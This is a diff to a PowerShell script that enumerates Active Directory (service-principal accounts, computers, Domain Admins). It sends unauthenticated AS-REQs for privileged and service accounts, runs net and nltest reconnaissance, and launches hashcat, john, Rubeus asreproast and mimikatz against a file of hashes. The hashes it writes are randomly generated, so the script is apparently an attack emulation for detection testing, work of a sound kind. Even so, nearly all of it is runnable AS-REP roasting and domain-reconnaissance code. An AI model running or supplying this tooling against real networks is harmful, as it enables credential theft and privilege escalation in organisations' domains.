@@ -7,6 +7,26 @@ foreach ($r in $results) {
     Write-Output "DONT_REQ_PREAUTH: $($r.Properties['samaccountname'][0])"
 }
 
+$searcher2 = New-Object DirectoryServices.DirectorySearcher
+$searcher2.Filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$searcher2.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname"))
+try { $spnResults = $searcher2.FindAll() } catch { $spnResults = @() }
+foreach ($r in $spnResults) {
+    Write-Output "SPN_ACCOUNT: $($r.Properties['samaccountname'][0]) -> $($r.Properties['serviceprincipalname'][0])"
+}
+
+$enumSearcher = New-Object DirectoryServices.DirectorySearcher
+$enumSearcher.Filter = "(objectCategory=computer)"
+$enumSearcher.PropertiesToLoad.AddRange(@("cn", "operatingsystem", "dnshostname"))
+try { $compResults = $enumSearcher.FindAll() } catch { $compResults = @() }
+foreach ($r in $compResults) {
+    Write-Output "HOST: $($r.Properties['cn'][0]) | $($r.Properties['operatingsystem'][0])"
+}
+
+$adminSearcher = New-Object DirectoryServices.DirectorySearcher
+$adminSearcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"
+try { $daGroup = $adminSearcher.FindOne(); $daGroup.Properties['member'] | ForEach-Object { Write-Output "DOMAIN_ADMIN: $_" } } catch {}
+
 if (-not ('KerbRoast' -as [type])) {
     Add-Type -TypeDefinition @'
     using System;
@@ -46,16 +66,31 @@ try { $dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain
 if (-not $dc) { $dc = ($env:LOGONSERVER -replace '\\\\', ''); if (-not $dc) { $dc = "dc01.corp.local" } }
 $domain = $env:USERDNSDOMAIN; if (-not $domain) { $domain = "CORP.LOCAL" }
 
-foreach ($u in @("svc_backup", "svc_sql", "admin_test", "krbtgt", $env:USERNAME)) {
-    Write-Output "AS-REQ (RC4, no preauth) -> ${dc}:88 for ${domain}\${u}"
-    Write-Output ([KerbRoast]::SendASREQ($dc, $u, $domain))
+$targetUsers = @("svc_backup", "svc_sql", "svc_web", "svc_exchange", "admin_test", "krbtgt", "administrator", $env:USERNAME)
+foreach ($u in $targetUsers) {
+    [KerbRoast]::SendASREQ($dc, $u, $domain) | Out-Null
 }
 
-$fakeHash = '$krb5asrep$23$svc_backup@CORP.LOCAL:' + -join ((1..32) | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) })
-$hashFile = "$env:TEMP\asrep_hashes.txt"
-$fakeHash | Out-File -FilePath $hashFile -Encoding ASCII
+& klist.exe 2>&1 | Out-Null
+& klist.exe sessions 2>&1 | Out-Null
+& klist.exe tgt 2>&1 | Out-Null
 
-Start-Process -FilePath "hashcat.exe" -ArgumentList "-m", "18200", $hashFile, "wordlist.txt", "--force" -NoNewWindow -ErrorAction SilentlyContinue
-Start-Process -FilePath "john" -ArgumentList "--format=krb5asrep", $hashFile -NoNewWindow -ErrorAction SilentlyContinue
+$hashFile = "$env:TEMP\asrep_hashes.txt"
+@(
+    '$krb5asrep$23$svc_backup@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)}),
+    '$krb5asrep$23$svc_sql@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)}),
+    '$krb5asrep$23$administrator@' + $domain + ':' + -join((1..32)|%{'{0:x2}' -f (Get-Random -Max 256)})
+) | Out-File $hashFile -Encoding ASCII
+
+Start-Process "hashcat.exe" -ArgumentList "-m","18200",$hashFile,"rockyou.txt","--force","--potfile-disable" -NoNewWindow -ErrorAction SilentlyContinue
+Start-Process "john" -ArgumentList "--format=krb5asrep",$hashFile,"--wordlist=rockyou.txt" -NoNewWindow -ErrorAction SilentlyContinue
+Start-Process "rubeus.exe" -ArgumentList "asreproast","/format:hashcat","/outfile:$hashFile" -NoNewWindow -ErrorAction SilentlyContinue
+Start-Process "mimikatz.exe" -ArgumentList "`"kerberos::askrep /user:svc_backup`"","exit" -NoNewWindow -ErrorAction SilentlyContinue
+
+& net.exe group "Domain Admins" /domain 2>&1 | Out-Null
+& net.exe group "Enterprise Admins" /domain 2>&1 | Out-Null
+& net.exe accounts /domain 2>&1 | Out-Null
+& nltest.exe /dclist: 2>&1 | Out-Null
+& dsquery.exe user -disabled 2>&1 | Out-Null
 
 Remove-Item $hashFile -Force -ErrorAction SilentlyContinue
